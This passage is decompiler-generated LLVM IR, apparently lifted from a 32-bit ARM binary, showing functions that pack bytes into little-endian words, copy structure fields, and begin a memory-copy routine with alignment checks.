  %v4_d918 = mul nuw nsw i32 %v4_d90c, 65536
  %v5_d918 = or i32 %v4_d918, %v5_d910
  %v4_d91c = mul nuw i32 %v4_d914, 16777216
  %v5_d91c = or i32 %v5_d918, %v4_d91c
  store i32 %v5_d91c, i32* %r3.global-to-local, align 4
  %v1_d920 = load i32, i32* %r7.global-to-local, align 4
  %v2_d920 = add i32 %v1_d920, 64
  %v3_d920 = inttoptr i32 %v2_d920 to i32*
  store i32 %v5_d91c, i32* %v3_d920, align 4
  %v0_d924 = load i32, i32* %r4.global-to-local, align 4
  %v1_d924 = add i32 %v0_d924, 73
  %v2_d924 = inttoptr i32 %v1_d924 to i8*
  %v3_d924 = load i8, i8* %v2_d924, align 1
  %v4_d924 = zext i8 %v3_d924 to i32
  %v1_d928 = add i32 %v0_d924, 72
  %v2_d928 = inttoptr i32 %v1_d928 to i8*
  %v3_d928 = load i8, i8* %v2_d928, align 1
  %v4_d928 = zext i8 %v3_d928 to i32
  store i32 %v4_d928, i32* %r3.global-to-local, align 4
  %v1_d92c = add i32 %v0_d924, 74
  %v2_d92c = inttoptr i32 %v1_d92c to i8*
  %v3_d92c = load i8, i8* %v2_d92c, align 1
  %v4_d92c = zext i8 %v3_d92c to i32
  %v4_d930 = mul nuw nsw i32 %v4_d924, 256
  %v5_d930 = or i32 %v4_d928, %v4_d930
  store i32 %v5_d930, i32* %r3.global-to-local, align 4
  %v1_d934 = add i32 %v0_d924, 75
  %v2_d934 = inttoptr i32 %v1_d934 to i8*
  %v3_d934 = load i8, i8* %v2_d934, align 1
  %v4_d934 = zext i8 %v3_d934 to i32
  %v4_d938 = mul nuw nsw i32 %v4_d92c, 65536
  %v5_d938 = or i32 %v4_d938, %v5_d930
  %v4_d93c = mul nuw i32 %v4_d934, 16777216
  %v5_d93c = or i32 %v5_d938, %v4_d93c
  store i32 %v5_d93c, i32* %r3.global-to-local, align 4
  %v1_d940 = load i32, i32* %r7.global-to-local, align 4
  %v2_d940 = add i32 %v1_d940, 72
  %v3_d940 = inttoptr i32 %v2_d940 to i32*
  store i32 %v5_d93c, i32* %v3_d940, align 4
  %v0_d944 = load i32, i32* %r4.global-to-local, align 4
  %v1_d944 = add i32 %v0_d944, 81
  %v2_d944 = inttoptr i32 %v1_d944 to i8*
  %v3_d944 = load i8, i8* %v2_d944, align 1
  %v4_d944 = zext i8 %v3_d944 to i32
  %v1_d948 = add i32 %v0_d944, 80
  %v2_d948 = inttoptr i32 %v1_d948 to i8*
  %v3_d948 = load i8, i8* %v2_d948, align 1
  %v4_d948 = zext i8 %v3_d948 to i32
  store i32 %v4_d948, i32* %r3.global-to-local, align 4
  %v1_d94c = add i32 %v0_d944, 82
  %v2_d94c = inttoptr i32 %v1_d94c to i8*
  %v3_d94c = load i8, i8* %v2_d94c, align 1
  %v4_d94c = zext i8 %v3_d94c to i32
  %v4_d950 = mul nuw nsw i32 %v4_d944, 256
  %v5_d950 = or i32 %v4_d948, %v4_d950
  store i32 %v5_d950, i32* %r3.global-to-local, align 4
  %v1_d954 = add i32 %v0_d944, 83
  %v2_d954 = inttoptr i32 %v1_d954 to i8*
  %v3_d954 = load i8, i8* %v2_d954, align 1
  %v4_d954 = zext i8 %v3_d954 to i32
  %v4_d958 = mul nuw nsw i32 %v4_d94c, 65536
  %v5_d958 = or i32 %v4_d958, %v5_d950
  %v4_d95c = mul nuw i32 %v4_d954, 16777216
  %v5_d95c = or i32 %v5_d958, %v4_d95c
  store i32 %v5_d95c, i32* %r3.global-to-local, align 4
  %v1_d960 = load i32, i32* %r7.global-to-local, align 4
  %v2_d960 = add i32 %v1_d960, 80
  %v3_d960 = inttoptr i32 %v2_d960 to i32*
  store i32 %v5_d95c, i32* %v3_d960, align 4
  %v0_d964 = load i32, i32* %r4.global-to-local, align 4
  %v1_d964 = add i32 %v0_d964, 69
  %v2_d964 = inttoptr i32 %v1_d964 to i8*
  %v3_d964 = load i8, i8* %v2_d964, align 1
  %v4_d964 = zext i8 %v3_d964 to i32
  %v1_d968 = add i32 %v0_d964, 68
  %v2_d968 = inttoptr i32 %v1_d968 to i8*
  %v3_d968 = load i8, i8* %v2_d968, align 1
  %v4_d968 = zext i8 %v3_d968 to i32
  store i32 %v4_d968, i32* %r3.global-to-local, align 4
  %v1_d96c = add i32 %v0_d964, 70
  %v2_d96c = inttoptr i32 %v1_d96c to i8*
  %v3_d96c = load i8, i8* %v2_d96c, align 1
  %v4_d96c = zext i8 %v3_d96c to i32
  %v4_d970 = mul nuw nsw i32 %v4_d964, 256
  %v5_d970 = or i32 %v4_d968, %v4_d970
  store i32 %v5_d970, i32* %r3.global-to-local, align 4
  %v1_d974 = add i32 %v0_d964, 71
  %v2_d974 = inttoptr i32 %v1_d974 to i8*
  %v3_d974 = load i8, i8* %v2_d974, align 1
  %v4_d974 = zext i8 %v3_d974 to i32
  %v4_d978 = mul nuw nsw i32 %v4_d96c, 65536
  %v5_d978 = or i32 %v4_d978, %v5_d970
  %v4_d97c = mul nuw i32 %v4_d974, 16777216
  %v5_d97c = or i32 %v5_d978, %v4_d97c
  store i32 %v5_d97c, i32* %r3.global-to-local, align 4
  %v1_d980 = load i32, i32* %r7.global-to-local, align 4
  %v2_d980 = add i32 %v1_d980, 68
  %v3_d980 = inttoptr i32 %v2_d980 to i32*
  store i32 %v5_d97c, i32* %v3_d980, align 4
  %v0_d984 = load i32, i32* %r4.global-to-local, align 4
  %v1_d984 = add i32 %v0_d984, 77
  %v2_d984 = inttoptr i32 %v1_d984 to i8*
  %v3_d984 = load i8, i8* %v2_d984, align 1
  %v4_d984 = zext i8 %v3_d984 to i32
  %v1_d988 = add i32 %v0_d984, 76
  %v2_d988 = inttoptr i32 %v1_d988 to i8*
  %v3_d988 = load i8, i8* %v2_d988, align 1
  %v4_d988 = zext i8 %v3_d988 to i32
  store i32 %v4_d988, i32* %r3.global-to-local, align 4
  %v1_d98c = add i32 %v0_d984, 78
  %v2_d98c = inttoptr i32 %v1_d98c to i8*
  %v3_d98c = load i8, i8* %v2_d98c, align 1
  %v4_d98c = zext i8 %v3_d98c to i32
  %v4_d990 = mul nuw nsw i32 %v4_d984, 256
  %v5_d990 = or i32 %v4_d988, %v4_d990
  store i32 %v5_d990, i32* %r3.global-to-local, align 4
  %v1_d994 = add i32 %v0_d984, 79
  %v2_d994 = inttoptr i32 %v1_d994 to i8*
  %v3_d994 = load i8, i8* %v2_d994, align 1
  %v4_d994 = zext i8 %v3_d994 to i32
  %v4_d998 = mul nuw nsw i32 %v4_d98c, 65536
  %v5_d998 = or i32 %v4_d998, %v5_d990
  %v4_d99c = mul nuw i32 %v4_d994, 16777216
  %v5_d99c = or i32 %v5_d998, %v4_d99c
  store i32 %v5_d99c, i32* %r3.global-to-local, align 4
  %v1_d9a0 = load i32, i32* %r7.global-to-local, align 4
  %v2_d9a0 = add i32 %v1_d9a0, 76
  %v3_d9a0 = inttoptr i32 %v2_d9a0 to i32*
  store i32 %v5_d99c, i32* %v3_d9a0, align 4
  %v0_d9a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_d9a4 = add i32 %v0_d9a4, 85
  %v2_d9a4 = inttoptr i32 %v1_d9a4 to i8*
  %v3_d9a4 = load i8, i8* %v2_d9a4, align 1
  %v4_d9a4 = zext i8 %v3_d9a4 to i32
  %v1_d9a8 = add i32 %v0_d9a4, 84
  %v2_d9a8 = inttoptr i32 %v1_d9a8 to i8*
  %v3_d9a8 = load i8, i8* %v2_d9a8, align 1
  %v4_d9a8 = zext i8 %v3_d9a8 to i32
  store i32 %v4_d9a8, i32* %r3.global-to-local, align 4
  %v1_d9ac = add i32 %v0_d9a4, 86
  %v2_d9ac = inttoptr i32 %v1_d9ac to i8*
  %v3_d9ac = load i8, i8* %v2_d9ac, align 1
  %v4_d9ac = zext i8 %v3_d9ac to i32
  %v4_d9b0 = mul nuw nsw i32 %v4_d9a4, 256
  %v5_d9b0 = or i32 %v4_d9a8, %v4_d9b0
  store i32 %v5_d9b0, i32* %r3.global-to-local, align 4
  %v1_d9b4 = add i32 %v0_d9a4, 87
  %v2_d9b4 = inttoptr i32 %v1_d9b4 to i8*
  %v3_d9b4 = load i8, i8* %v2_d9b4, align 1
  %v4_d9b4 = zext i8 %v3_d9b4 to i32
  %v4_d9b8 = mul nuw nsw i32 %v4_d9ac, 65536
  %v5_d9b8 = or i32 %v4_d9b8, %v5_d9b0
  %v4_d9bc = mul nuw i32 %v4_d9b4, 16777216
  %v5_d9bc = or i32 %v5_d9b8, %v4_d9bc
  store i32 %v5_d9bc, i32* %r3.global-to-local, align 4
  %v1_d9c0 = load i32, i32* %r7.global-to-local, align 4
  %v2_d9c0 = add i32 %v1_d9c0, 84
  %v3_d9c0 = inttoptr i32 %v2_d9c0 to i32*
  store i32 %v5_d9bc, i32* %v3_d9c0, align 4
  ret i32 %v4_d8c4

; uselistorder directives
  uselistorder i32 %v4_d8c4, { 1, 0 }
  uselistorder i32 %v0_d8b8, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v0_d848, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v0_d7f8, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v0_d718, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %tmp, { 6, 5, 3, 4, 2, 1, 0, 7 }
  uselistorder i32 87, { 1, 0 }
  uselistorder i32 84, { 1, 2, 0, 3 }
  uselistorder i32 59, { 1, 0 }
  uselistorder i32 61, { 1, 0, 2 }
  uselistorder i32 55, { 1, 0, 2 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 50, { 1, 0 }
  uselistorder i32 45, { 1, 0 }
  uselistorder i32 33, { 1, 0 }
  uselistorder i32 30, { 4, 3, 1, 5, 2, 6, 0 }
  uselistorder i32 29, { 3, 0, 4, 1, 5, 2 }
  uselistorder i32 26, { 3, 0, 1, 2 }
  uselistorder i32 25, { 3, 4, 5, 1, 0, 2 }
  uselistorder i32 23, { 3, 0, 1, 2 }
  uselistorder i32 22, { 16, 0, 1, 28, 2, 3, 11, 17, 12, 18, 13, 19, 14, 20, 8, 21, 9, 22, 10, 23, 4, 24, 5, 25, 6, 26, 7, 27, 15 }
  uselistorder i32 21, { 3, 0, 1, 2 }
  uselistorder i32 19, { 1, 3, 4, 5, 2, 0 }
  uselistorder i32 18, { 3, 6, 7, 8, 4, 0, 1, 5, 2 }
  uselistorder i32 17, { 9, 20, 0, 2, 21, 3, 22, 4, 23, 1, 24, 10, 11, 12, 5, 15, 13, 16, 14, 17, 18, 6, 19, 7, 8 }
  uselistorder i32 6, { 12, 16, 2, 3, 4, 17, 13, 14, 11, 0, 15, 5, 6, 1, 7, 8, 9, 10 }
  uselistorder i32 5, { 11, 15, 1, 12, 0, 13, 14, 10, 17, 2, 18, 16, 3, 5, 4, 6, 7, 8, 9 }
}

define i32 @function_d9cc(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_d9cc:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_d9cc = load i32, i32* @r4, align 4
  store i32 %v3_d9cc, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v2_d9e4 = inttoptr i32 %arg2 to i8*
  %v3_d9e4 = call i32 @function_be40(i8* %v2_d9e4, i32 0)
  store i32 %v3_d9e4, i32* %r0.global-to-local, align 4
  %v0_d9e8 = load i32, i32* %r5.global-to-local, align 4
  %v1_d9e8 = inttoptr i32 %v0_d9e8 to i32*
  %v2_d9e8 = load i32, i32* %v1_d9e8, align 4
  store i32 %v2_d9e8, i32* %r3.global-to-local, align 4
  %v1_d9ec = add i32 %v0_d9e8, 4
  %v2_d9ec = inttoptr i32 %v1_d9ec to i32*
  %v3_d9ec = load i32, i32* %v2_d9ec, align 4
  store i32 %v3_d9ec, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_d9f4 = load i32, i32* %r6.global-to-local, align 4
  %v1_d9f4 = inttoptr i32 %v0_d9f4 to i32*
  store i32 %v2_d9e8, i32* %v1_d9f4, align 4
  %v3_d9f4 = add i32 %v0_d9f4, 4
  %v4_d9f4 = inttoptr i32 %v3_d9f4 to i32*
  %v5_d9f4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_d9f4, i32* %v4_d9f4, align 4
  %v0_d9f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_d9f8 = load i32, i32* %r6.global-to-local, align 4
  %v2_d9f8 = add i32 %v1_d9f8, 12
  %v3_d9f8 = inttoptr i32 %v2_d9f8 to i32*
  store i32 %v0_d9f8, i32* %v3_d9f8, align 4
  %v0_d9fc = load i32, i32* %r5.global-to-local, align 4
  %v1_d9fc = add i32 %v0_d9fc, 9
  %v2_d9fc = inttoptr i32 %v1_d9fc to i8*
  %v3_d9fc = load i8, i8* %v2_d9fc, align 1
  %v4_d9fc = zext i8 %v3_d9fc to i32
  store i32 %v4_d9fc, i32* %r2.global-to-local, align 4
  %v1_da00 = add i32 %v0_d9fc, 8
  %v2_da00 = inttoptr i32 %v1_da00 to i8*
  %v3_da00 = load i8, i8* %v2_da00, align 1
  %v4_da00 = zext i8 %v3_da00 to i32
  %v4_da04 = mul nuw nsw i32 %v4_d9fc, 256
  %v5_da04 = or i32 %v4_da00, %v4_da04
  store i32 %v5_da04, i32* %r3.global-to-local, align 4
  %v1_da08 = load i32, i32* %r6.global-to-local, align 4
  %v2_da08 = add i32 %v1_da08, 16
  %v3_da08 = inttoptr i32 %v2_da08 to i32*
  store i32 %v5_da04, i32* %v3_da08, align 4
  %v0_da0c = load i32, i32* %r5.global-to-local, align 4
  %v1_da0c = add i32 %v0_da0c, 11
  %v2_da0c = inttoptr i32 %v1_da0c to i8*
  %v3_da0c = load i8, i8* %v2_da0c, align 1
  %v4_da0c = zext i8 %v3_da0c to i32
  store i32 %v4_da0c, i32* %r2.global-to-local, align 4
  %v1_da10 = add i32 %v0_da0c, 10
  %v2_da10 = inttoptr i32 %v1_da10 to i8*
  %v3_da10 = load i8, i8* %v2_da10, align 1
  %v4_da10 = zext i8 %v3_da10 to i32
  %v4_da14 = mul nuw nsw i32 %v4_da0c, 256
  %v5_da14 = or i32 %v4_da10, %v4_da14
  store i32 %v5_da14, i32* %r3.global-to-local, align 4
  %v1_da18 = load i32, i32* %r6.global-to-local, align 4
  %v2_da18 = add i32 %v1_da18, 20
  %v3_da18 = inttoptr i32 %v2_da18 to i32*
  store i32 %v5_da14, i32* %v3_da18, align 4
  %v0_da1c = load i32, i32* %r5.global-to-local, align 4
  %v1_da1c = add i32 %v0_da1c, 13
  %v2_da1c = inttoptr i32 %v1_da1c to i8*
  %v3_da1c = load i8, i8* %v2_da1c, align 1
  %v4_da1c = zext i8 %v3_da1c to i32
  store i32 %v4_da1c, i32* %r2.global-to-local, align 4
  %v1_da20 = add i32 %v0_da1c, 12
  %v2_da20 = inttoptr i32 %v1_da20 to i8*
  %v3_da20 = load i8, i8* %v2_da20, align 1
  %v4_da20 = zext i8 %v3_da20 to i32
  %v4_da24 = mul nuw nsw i32 %v4_da1c, 256
  %v5_da24 = or i32 %v4_da20, %v4_da24
  store i32 %v5_da24, i32* %r3.global-to-local, align 4
  %v1_da28 = load i32, i32* %r6.global-to-local, align 4
  %v2_da28 = add i32 %v1_da28, 24
  %v3_da28 = inttoptr i32 %v2_da28 to i32*
  store i32 %v5_da24, i32* %v3_da28, align 4
  %v0_da2c = load i32, i32* %r5.global-to-local, align 4
  %v1_da2c = add i32 %v0_da2c, 20
  %v2_da2c = inttoptr i32 %v1_da2c to i32*
  %v3_da2c = load i32, i32* %v2_da2c, align 4
  store i32 %v3_da2c, i32* %r3.global-to-local, align 4
  %v1_da30 = add i32 %v0_da2c, 14
  %v2_da30 = inttoptr i32 %v1_da30 to i8*
  %v3_da30 = load i8, i8* %v2_da30, align 1
  %v4_da30 = zext i8 %v3_da30 to i32
  store i32 %v4_da30, i32* %r0.global-to-local, align 4
  %v1_da34 = add i32 %v0_da2c, 15
  %v2_da34 = inttoptr i32 %v1_da34 to i8*
  %v3_da34 = load i8, i8* %v2_da34, align 1
  %v4_da34 = zext i8 %v3_da34 to i32
  store i32 %v4_da34, i32* %ip.global-to-local, align 4
  %v1_da38 = add i32 %v0_da2c, 16
  %v2_da38 = inttoptr i32 %v1_da38 to i32*
  %v3_da38 = load i32, i32* %v2_da38, align 4
  store i32 %v3_da38, i32* %r1.global-to-local, align 4
  %v1_da3c = load i32, i32* %r6.global-to-local, align 4
  %v2_da3c = add i32 %v1_da3c, 44
  %v3_da3c = inttoptr i32 %v2_da3c to i32*
  store i32 %v3_da2c, i32* %v3_da3c, align 4
  %v0_da40 = load i32, i32* %r5.global-to-local, align 4
  %v1_da40 = add i32 %v0_da40, 24
  %v2_da40 = inttoptr i32 %v1_da40 to i32*
  %v3_da40 = load i32, i32* %v2_da40, align 4
  store i32 %v3_da40, i32* %r3.global-to-local, align 4
  %v1_da44 = load i32, i32* %r6.global-to-local, align 4
  %v2_da44 = add i32 %v1_da44, 48
  %v3_da44 = inttoptr i32 %v2_da44 to i32*
  store i32 %v3_da40, i32* %v3_da44, align 4
  %v0_da48 = load i32, i32* %r5.global-to-local, align 4
  %v1_da48 = add i32 %v0_da48, 28
  %v2_da48 = inttoptr i32 %v1_da48 to i32*
  %v3_da48 = load i32, i32* %v2_da48, align 4
  store i32 %v3_da48, i32* %r3.global-to-local, align 4
  %v1_da4c = load i32, i32* %r6.global-to-local, align 4
  %v2_da4c = add i32 %v1_da4c, 52
  %v3_da4c = inttoptr i32 %v2_da4c to i32*
  store i32 %v3_da48, i32* %v3_da4c, align 4
  %v0_da50 = load i32, i32* %r5.global-to-local, align 4
  %v1_da50 = add i32 %v0_da50, 32
  %v2_da50 = inttoptr i32 %v1_da50 to i32*
  %v3_da50 = load i32, i32* %v2_da50, align 4
  store i32 %v3_da50, i32* %r3.global-to-local, align 4
  %v1_da54 = load i32, i32* %r6.global-to-local, align 4
  %v2_da54 = add i32 %v1_da54, 56
  %v3_da54 = inttoptr i32 %v2_da54 to i32*
  store i32 %v3_da50, i32* %v3_da54, align 4
  %v0_da58 = load i32, i32* %r5.global-to-local, align 4
  %v1_da58 = add i32 %v0_da58, 40
  %v2_da58 = inttoptr i32 %v1_da58 to i32*
  %v3_da58 = load i32, i32* %v2_da58, align 4
  store i32 %v3_da58, i32* %r3.global-to-local, align 4
  %v1_da5c = load i32, i32* %r6.global-to-local, align 4
  %v2_da5c = add i32 %v1_da5c, 64
  %v3_da5c = inttoptr i32 %v2_da5c to i32*
  store i32 %v3_da58, i32* %v3_da5c, align 4
  %v0_da60 = load i32, i32* %r5.global-to-local, align 4
  %v1_da60 = add i32 %v0_da60, 48
  %v2_da60 = inttoptr i32 %v1_da60 to i32*
  %v3_da60 = load i32, i32* %v2_da60, align 4
  store i32 %v3_da60, i32* %r3.global-to-local, align 4
  %v1_da64 = load i32, i32* %r6.global-to-local, align 4
  %v2_da64 = add i32 %v1_da64, 72
  %v3_da64 = inttoptr i32 %v2_da64 to i32*
  store i32 %v3_da60, i32* %v3_da64, align 4
  %v0_da68 = load i32, i32* %r5.global-to-local, align 4
  %v1_da68 = add i32 %v0_da68, 36
  %v2_da68 = inttoptr i32 %v1_da68 to i32*
  %v3_da68 = load i32, i32* %v2_da68, align 4
  store i32 %v3_da68, i32* %r3.global-to-local, align 4
  %v1_da6c = load i32, i32* %r6.global-to-local, align 4
  %v2_da6c = add i32 %v1_da6c, 60
  %v3_da6c = inttoptr i32 %v2_da6c to i32*
  store i32 %v3_da68, i32* %v3_da6c, align 4
  %v0_da70 = load i32, i32* %r5.global-to-local, align 4
  %v1_da70 = add i32 %v0_da70, 44
  %v2_da70 = inttoptr i32 %v1_da70 to i32*
  %v3_da70 = load i32, i32* %v2_da70, align 4
  store i32 %v3_da70, i32* %r3.global-to-local, align 4
  %v0_da74 = load i32, i32* %r0.global-to-local, align 4
  %v1_da74 = load i32, i32* %ip.global-to-local, align 4
  %v4_da74 = mul i32 %v1_da74, 256
  %v5_da74 = or i32 %v4_da74, %v0_da74
  store i32 %v5_da74, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_da7c = load i32, i32* %r6.global-to-local, align 4
  %v2_da7c = add i32 %v1_da7c, 28
  %v3_da7c = inttoptr i32 %v2_da7c to i32*
  store i32 %v5_da74, i32* %v3_da7c, align 4
  %v0_da80 = load i32, i32* %r1.global-to-local, align 4
  %v1_da80 = load i32, i32* %r6.global-to-local, align 4
  %v2_da80 = add i32 %v1_da80, 32
  %v3_da80 = inttoptr i32 %v2_da80 to i32*
  store i32 %v0_da80, i32* %v3_da80, align 4
  %v0_da84 = load i32, i32* %r2.global-to-local, align 4
  %v1_da84 = load i32, i32* %r6.global-to-local, align 4
  %v2_da84 = add i32 %v1_da84, 36
  %v3_da84 = inttoptr i32 %v2_da84 to i32*
  store i32 %v0_da84, i32* %v3_da84, align 4
  %v0_da88 = load i32, i32* %r3.global-to-local, align 4
  %v1_da88 = load i32, i32* %r6.global-to-local, align 4
  %v2_da88 = add i32 %v1_da88, 68
  %v3_da88 = inttoptr i32 %v2_da88 to i32*
  store i32 %v0_da88, i32* %v3_da88, align 4
  %v0_da8c = load i32, i32* %r5.global-to-local, align 4
  %v1_da8c = add i32 %v0_da8c, 52
  %v2_da8c = inttoptr i32 %v1_da8c to i32*
  %v3_da8c = load i32, i32* %v2_da8c, align 4
  store i32 %v3_da8c, i32* %r3.global-to-local, align 4
  %v1_da90 = load i32, i32* %r6.global-to-local, align 4
  %v2_da90 = add i32 %v1_da90, 76
  %v3_da90 = inttoptr i32 %v2_da90 to i32*
  store i32 %v3_da8c, i32* %v3_da90, align 4
  %v2_da94 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_da94, i32* %r4.global-to-local, align 4
  ret i32 %v5_da74

; uselistorder directives
  uselistorder i32 %v0_da2c, { 1, 0, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32 76, { 2, 0, 1 }
  uselistorder i32 68, { 2, 0, 1 }
  uselistorder i32 60, { 2, 0, 1 }
  uselistorder i32 72, { 2, 0, 1 }
  uselistorder i32 64, { 4, 2, 3, 1, 5, 0 }
  uselistorder i32 56, { 2, 0, 1 }
  uselistorder i32 52, { 3, 4, 1, 2, 0 }
  uselistorder i32 15, { 9, 6, 5, 7, 8, 4, 0, 1, 2, 3 }
  uselistorder i32 14, { 5, 3, 6, 4, 2, 0, 1 }
  uselistorder i32 13, { 8, 4, 3, 5, 2, 6, 7, 0, 1 }
  uselistorder i32 10, { 24, 25, 16, 19, 21, 0, 3, 20, 1, 26, 4, 17, 18, 15, 5, 22, 6, 7, 8, 2, 9, 10, 11, 12, 13, 23, 27, 28, 29, 30, 14 }
  uselistorder i32 9, { 14, 15, 16, 3, 1, 2, 17, 4, 5, 11, 10, 6, 12, 7, 0, 8, 9, 13, 18, 19, 20, 21 }
  uselistorder i32 (i8*, i32)* @function_be40, { 1, 0, 7, 6, 2, 3, 4, 5 }
  uselistorder i32 88, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
}

define i32 @function_da98(i32 %arg1) local_unnamed_addr {
dec_label_pc_da98:
  ret i32 %arg1
}

define i32 @function_daa0() local_unnamed_addr {
dec_label_pc_daa0:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_daa0 = load i32, i32* @r1, align 4
  %v1_daa0 = load i32, i32* @r0, align 4
  %v2_daa0 = sub i32 %v0_daa0, %v1_daa0
  %v3_daa0 = icmp ult i32 %v0_daa0, %v1_daa0
  %v4_daa0 = xor i32 %v1_daa0, %v0_daa0
  %v5_daa0 = xor i32 %v2_daa0, %v0_daa0
  %v6_daa0 = and i32 %v5_daa0, %v4_daa0
  %v7_daa0 = icmp slt i32 %v6_daa0, 0
  store i1 %v7_daa0, i1* %cpsr_v.global-to-local, align 1
  %v8_daa0 = icmp slt i32 %v2_daa0, 0
  store i1 %v8_daa0, i1* %cpsr_n.global-to-local, align 1
  %v9_daa0 = icmp eq i32 %v0_daa0, %v1_daa0
  store i1 %v9_daa0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_daa0, label %dec_label_pc_dcec, label %dec_label_pc_daa8

dec_label_pc_daa8:                                ; preds = %dec_label_pc_daa0
  br i1 %v9_daa0, label %.thread122, label %bb

.thread122:                                       ; preds = %bb144, %.thread121, %bb141, %dec_label_pc_daa8
  %merge = phi i32 [ %v0_daa0, %dec_label_pc_daa8 ], [ %v2_dd80, %bb141 ], [ %v11_dd9c, %bb144 ], [ %v7_dd9c, %.thread121 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_daa8
  store i32 %v1_daa0, i32* %stack_var_-8, align 4
  %v0_dab0 = load i32, i32* @r2, align 4
  %v2_dab0 = add i32 %v0_dab0, -4
  store i32 %v2_dab0, i32* %r2.global-to-local, align 4
  %v4_dab0 = sub i32 3, %v0_dab0
  %v5_dab0 = and i32 %v4_dab0, %v0_dab0
  %v6_dab0 = icmp slt i32 %v5_dab0, 0
  store i1 %v6_dab0, i1* %cpsr_v.global-to-local, align 1
  %v7_dab0 = icmp slt i32 %v2_dab0, 0
  store i1 %v7_dab0, i1* %cpsr_n.global-to-local, align 1
  %v8_dab0 = icmp eq i32 %v0_dab0, 4
  store i1 %v8_dab0, i1* %cpsr_z.global-to-local, align 1
  %v5_dab4 = icmp slt i32 %v0_dab0, 4
  br i1 %v5_dab4, label %bb131, label %dec_label_pc_dab8

dec_label_pc_dab8:                                ; preds = %bb
  %v1_dab8 = urem i32 %v1_daa0, 4
  store i32 %v1_dab8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_dab8 = icmp eq i32 %v1_dab8, 0
  store i1 %v2_dab8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_dab8, label %dec_label_pc_dac0, label %dec_label_pc_db64

dec_label_pc_dac0:                                ; preds = %dec_label_pc_dab8
  %v1_dac0 = urem i32 %v0_daa0, 4
  store i32 %v1_dac0, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_dac0 = icmp eq i32 %v1_dac0, 0
  store i1 %v2_dac0, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_daa0 to i2
  br i1 %v2_dac0, label %dec_label_pc_dac8, label %dec_label_pc_db94

dec_label_pc_dac8:                                ; preds = %dec_label_pc_dac0, %dec_label_pc_db8c
  %v0_dae092 = phi i32 [ %v1_daa0, %dec_label_pc_dac0 ], [ %v0_dbdc75, %dec_label_pc_db8c ]
  %v0_dadc91 = phi i32 [ %v0_daa0, %dec_label_pc_dac0 ], [ %v0_db8c, %dec_label_pc_db8c ]
  %v0_dac8 = phi i32 [ %v2_dab0, %dec_label_pc_dac0 ], [ %v2_db84, %dec_label_pc_db8c ]
  %v2_dac8 = add i32 %v0_dac8, -8
  store i32 %v2_dac8, i32* %r2.global-to-local, align 4
  %v4_dac8 = sub i32 7, %v0_dac8
  %v5_dac8 = and i32 %v4_dac8, %v0_dac8
  %v6_dac8 = icmp slt i32 %v5_dac8, 0
  store i1 %v6_dac8, i1* %cpsr_v.global-to-local, align 1
  %v7_dac8 = icmp slt i32 %v2_dac8, 0
  store i1 %v7_dac8, i1* %cpsr_n.global-to-local, align 1
  %v8_dac8 = icmp eq i32 %v0_dac8, 8
  store i1 %v8_dac8, i1* %cpsr_z.global-to-local, align 1
  %v5_dacc = icmp slt i32 %v0_dac8, 8
  br i1 %v5_dacc, label %dec_label_pc_db1c, label %dec_label_pc_dad0

dec_label_pc_dad0:                                ; preds = %dec_label_pc_dac8
  %v2_dad0 = add i32 %v0_dac8, -28
  store i32 %v2_dad0, i32* %r2.global-to-local, align 4
  %v4_dad0 = sub i32 27, %v0_dac8
  %v5_dad0 = and i32 %v4_dad0, %v2_dac8
  %v6_dad0 = icmp slt i32 %v5_dad0, 0
  store i1 %v6_dad0, i1* %cpsr_v.global-to-local, align 1
  %v7_dad0 = icmp slt i32 %v2_dad0, 0
  store i1 %v7_dad0, i1* %cpsr_n.global-to-local, align 1
  %v8_dad0 = icmp eq i32 %v2_dac8, 20
  store i1 %v8_dad0, i1* %cpsr_z.global-to-local, align 1
